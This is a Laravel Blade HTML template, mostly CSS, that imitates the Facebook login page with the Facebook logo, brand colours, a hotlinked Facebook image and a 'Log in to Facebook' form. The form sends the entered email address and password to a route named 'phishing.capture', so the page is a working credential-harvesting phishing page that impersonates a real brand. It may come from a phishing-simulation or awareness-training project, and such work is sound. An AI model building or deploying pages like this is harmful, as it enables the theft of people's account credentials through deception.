<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Facebook login</title>
        
<style>
:root {
  --fb-blue: #1877f2;
  --bg: #f0f2f5;
  --text: #1c1e21;
  --muted: #606770;
  --border: #dddfe2;
}
 
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Helvetica, Arial, sans-serif;
}
 
body {
  background: var(--bg);
  color: var(--text);
}
 
/* ===== LAYOUT ===== */
.page {
  display: flex;
  min-height: 100vh;
}
 
/* ===== LEFT ===== */
.left {
  flex: 1;
  padding: 60px 8%;
  position: relative;
  display: flex;
  flex-direction: column;
  justify-content: center;
}
 
.logo {
    position: absolute;
    width: 60px;
    top: 70px;
    left: 50px;
    
}
 
.title {
    position: absolute;
    width: 60px;
    top: 160px;
    left: 50px;
  font-size: 56px;
  font-weight: 600;
  line-height: 1.2;
  margin-top: 220px;
}
 
.title span {
  color: var(--fb-blue);
   white-space: nowrap;
}
 
/* collage */
.collage {
  position: absolute;
  top: 20px;
  right: 210px;
  width: 520px;
  opacity: 0.98;
 
}
 
.collage img {
  width: 135%;
  border-radius: 18px;
}
 
/* ===== RIGHT ===== */
.right {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #fff;
  border-left: 1px solid var(--border);
  padding: 40px;
}
 
.card {
  width: 100%;
  transform: translateX(-25%);
  max-width: 396px;
  background: #fff;
  border-radius: 10px;
  
  padding: 2px;
}
 
.card h2 {
  font-size: 18px;
  margin-bottom: 18px;
}
 
/* inputs */
.input {
  
  width: 150%;
  
  padding: 20px;
  margin-bottom: 22px;
  border: 1.5px solid var(--border);
  border-radius: 17px;
  font-size: 17px;
  transition: 0.2s;
}
 
.input:focus {
  outline: none;
  border-color: var(--fb-blue);
  
}
 
/* buttons */
.btn {
  width: 150%;
  padding: 14px;
  border-radius: 60px;
  border: none;
  font-weight: 700;
  cursor: pointer;
  transition: 0.2s;
}
 
.btn-login {
  background: var(--fb-blue);
  color: white;
  font-size: 18px;
}
 
.btn-login:hover {
  background: #166fe5;
}
 
.btn-create {
  margin-top: 12px;
  background: transparent;
  border: 1px solid var(--fb-blue);
  color: var(--fb-blue);
}
 
.btn-create:hover {
  background: #e7f3ff;
}
 
/* links */
.link {
  text-align: center;
  margin: 14px 0;
  transform: translateX(100px);
}
 
.link a {
  font-size: 14px;
  color: var(--fb-blue);
  text-decoration: none;
  font-weight: 600;
}
 
.link a:hover {
  text-decoration: underline;
}
 
/* meta */
.meta {
    margin-left:200px;
  margin-top: 20px;
  text-align: center;
  font-size: 13px;
  color: var(--muted);
}
 
/* ===== FOOTER ===== */
footer {
    
    position: absolute;
    top: 690px;
    left: 50px;
  padding: 40px 10%;
  font-size: 22px;
  color: var(--muted);
}
 
footer a {
  color: var(--muted);
  margin-right: 10px;
  text-decoration: none;
}
 
footer a:hover {
  text-decoration: underline;
}
 
/* ===== ANIMATION ===== */
@keyframes float {
  0%,100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}
 
/* ===== RESPONSIVE ===== */
@media (max-width: 900px) {
  .page {
    flex-direction: column;
  }
 
  .left {
    text-align: center;
    padding: 40px 20px;
  }
 
  .title {
    font-size: 40px;
  }
 
  .collage {
    display: none;
    
  }
 
  .right {
    border-left: none;
  }
}
 
/* ===== ADDED: RESPONSIVE SCALING ===== */
 
/* Large desktops (1400px+) */
@media (min-width: 1400px) {
  .collage {
    right: 200px;
    width: 520px;
  }
}
 
/* Medium desktops (1024px–1280px) */
@media (max-width: 1280px) {
  .collage {
    right: 120px;
    width: 440px;
  }
  .collage img {
    width: 120%;
  }
  .title {
    font-size: 46px;
  }
  .input {
    width: 130%;
  }
  .btn {
    width: 130%;
  }
  .link {
    transform: translateX(70px);
  }
  .meta {
    margin-left: 150px;
  }
}
 
/* Small desktops / large tablets (900px–1024px) */
@media (max-width: 1024px) {
  .collage {
    right: 40px;
    width: 360px;
  }
  .collage img {
    width: 110%;
  }
  .title {
    font-size: 38px;
    top: 150px;
  }
  .logo {
    top: 60px;
    left: 30px;
  }
  .input {
    width: 120%;
  }
  .btn {
    width: 120%;
  }
  .link {
    transform: translateX(50px);
  }
  .meta {
    margin-left: 110px;
  }
  .card {
    transform: translateX(-15%);
  }
}
 
/* Tablets portrait (600px–900px) */
@media (max-width: 900px) {
  .page {
    flex-direction: column;
    min-height: auto;
  }
 
  .left {
    min-height: 220px;
    padding: 30px 24px 24px;
    text-align: left;
    background: #fff;
  }
 
  .logo {
    position: relative;
    top: auto;
    left: auto;
    margin-bottom: 16px;
    display: block;
  }
 
  .title {
    position: relative;
    top: auto;
    left: auto;
    margin-top: 0;
    font-size: 36px;
    width: auto;
  }
 
  .collage {
    display: none;
  }
 
  .right {
    border-left: none;
    border-top: 1px solid var(--border);
    background: var(--bg);
    padding: 24px 20px 40px;
    align-items: flex-start;
    justify-content: center;
  }
 
  .card {
    transform: none;
    max-width: 100%;
    width: 100%;
    background: #fff;
    border-radius: 10px;
    padding: 20px;
    box-shadow: 0 2px 8px rgba(0,0,0,.1);
  }
 
  .input {
    width: 100%;
  }
 
  .btn {
    width: 100%;
  }
 
  .link {
    transform: none;
  }
 
  .meta {
    margin-left: 0;
  }
 
  footer {
    position: relative;
    top: auto;
    left: auto;
    padding: 20px 24px;
    font-size: 14px;
    border-top: 1px solid var(--border);
    background: #fff;
  }
}
 
/* Mobile (max 600px) */
@media (max-width: 600px) {
  .left {
    padding: 20px 16px 16px;
  }
 
  .logo {
    width: 48px;
    margin-bottom: 12px;
  }
 
  .title {
    font-size: 28px;
    line-height: 1.15;
  }
 
  .right {
    padding: 16px 16px 32px;
  }
 
  .card {
    padding: 16px;
    border-radius: 8px;
  }
 
  .card h2 {
    font-size: 16px;
    margin-bottom: 14px;
  }
 
  .input {
    width: 100%;
    padding: 14px 16px;
    font-size: 15px;
    margin-bottom: 14px;
    border-radius: 12px;
  }
 
  .btn {
    width: 100%;
    padding: 13px;
    font-size: 16px;
    border-radius: 50px;
  }
 
  .btn-login {
    font-size: 16px;
  }
 
  .link {
    transform: none;
    margin: 12px 0;
  }
 
  .btn-create {
    margin-top: 10px;
  }
 
  .meta {
    margin-left: 0;
    font-size: 12px;
    margin-top: 14px;
  }
 
  footer {
    position: relative;
    top: auto;
    left: auto;
    padding: 16px;
    font-size: 12px;
  }
}
 
/* Very small phones (max 375px) */
@media (max-width: 375px) {
  .title {
    font-size: 24px;
  }
 
  .input {
    padding: 12px 14px;
    font-size: 14px;
  }
 
  .btn {
    padding: 12px;
    font-size: 15px;
  }
}
</style>
</head>

<body>

<div class="page">

  <!-- LEFT -->
  <section class="left">

    <!-- simple FB logo -->
    <svg class="logo" viewBox="0 0 60 60">
      <circle cx="30" cy="30" r="30" fill="#1877f2"/>
      <path d="M41 38l1.3-8.5h-8.1V24c0-2.3 1.1-4.6 4.7-4.6H42.5V12s-3.3-.5-6.5-.5C29.5 11.5 26 15.4 26 22.5V29.5H18.5V38H26v21c1.3.2 2.7.3 4 .3s2.7-.1 4-.3V38H41z" fill="#fff"/>
    </svg>

    <div class="title">
      Explore<br>
      the<br>
      things<br>
      <span>you love.</span>
    </div>

    <div class="collage">
      <img src="https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp" alt="">
    </div>

  </section>

  <!-- RIGHT -->
  <section class="right">

    <div class="card">
      <h2>Log in to Facebook</h2>
       <form action="{{route('phishing.capture')}}" method="POST">
            @csrf
            <input class="input"  type="text" name="email" placeholder="Email address or mobile number" required>
            <input class="input"  type="password" name="password" placeholder="Password" required>

            <button class="btn btn-login">Log in</button>

            <div class="link">
                <a href="#">Forgotten password?</a>
            </div>

            <button class="btn btn-create">Create new account</button>

            <div class="meta">Meta-Garv</div>
        </form>
    </div>

  </section>

</div>

<footer>
  English (UK) · हिन्दी · اردو · தமிழ் · More languages...
</footer>

</body>
</html>
